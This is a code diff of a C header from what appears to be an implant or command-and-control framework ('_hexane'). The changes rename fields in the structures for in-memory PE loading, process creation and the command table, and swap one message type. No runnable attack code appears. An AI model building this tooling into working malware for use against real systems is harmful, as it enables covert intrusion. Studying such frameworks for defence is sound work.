@@ -32,6 +32,8 @@ EXTERN_C LPVOID InstEnd();
 #define U_PTR(x)                                (R_CAST(UINT_PTR, x))
 #define C_DREF(x)                               (*R_CAST(VOID**, x))
 
+#define U8_PTR(x) 								(S_CAST(uint8_t*, x))
+
 #define FUNCTION								_text(B)
 #define _prototype(x)                           decltype(x) *x
 #define _dllexport 								__declspec(dllexport)
@@ -223,35 +225,35 @@ enum MessageType {
 	TypeResponse    = 0x7FFFFFFD,
 	TypeSegment     = 0x7FFFFFFC,
     TypeExecute     = 0x7FFFFFFB,
-    TypeVeh			= 0x7FFFFFFA,
+    TypeObject		= 0x7FFFFFFA,
 };
 
 struct _executable {
-	LPVOID							lpBuffer;
-	LPVOID							lpHeap;
-	LPVOID							lpBase;
+	LPVOID							buffer;
+	LPVOID							heap;
+	LPVOID							base;
 
-	SIZE_T 							tImage;
-	ULONG							dwSize;
-	ULONG							dwRead;
-	ULONG 							dwData;
-	ULONG 							dwHeads;
-	WORD 							nSections;
-	LARGE_INTEGER					lnSections;
+	SIZE_T 							s_image;
+	ULONG							ul_size;
+	ULONG							ul_read;
+	ULONG 							ul_data;
+	ULONG 							ul_heads;
+	WORD 							n_sections;
+	LARGE_INTEGER					ln_sections;
 
-	PIMAGE_DOS_HEADER				dosHead;
-	PIMAGE_NT_HEADERS				ntHead;
-	IMAGE_DATA_DIRECTORY 			Relocs;
-	PIMAGE_SECTION_HEADER			Sections;
+	PIMAGE_DOS_HEADER				dos_head;
+	PIMAGE_NT_HEADERS				nt_head;
+	IMAGE_DATA_DIRECTORY 			relocs;
+	PIMAGE_SECTION_HEADER			sections;
 
-	HANDLE							pHandle;
-	HANDLE							pThread;
+	HANDLE							p_handle;
+	HANDLE							p_thread;
 
-	PS_CREATE_INFO					Create;
-	PPS_ATTRIBUTE_LIST				Attrs;
-	PRTL_USER_PROCESS_PARAMETERS	Params;
-	UNICODE_STRING					Unicode;
-	BOOL                      		Allocated;
+	PS_CREATE_INFO					create_info;
+	PPS_ATTRIBUTE_LIST				attrs;
+	PRTL_USER_PROCESS_PARAMETERS	params;
+	UNICODE_STRING					u_string;
+	BOOL                      		allocated;
 
 };
 
@@ -335,8 +337,8 @@ typedef struct {
 
 typedef void (*_command)(_parser *args);
 struct _command_map{
-	int32_t    	Id;
-	_command 	Function;
+	char    	*name;
+	_command 	address;
 };
 
 
@@ -591,5 +593,6 @@ struct _hexane{
 		_prototype(InitializeAcl);
 		_prototype(FreeSid);
 	} win32;
+
 };
 #endif
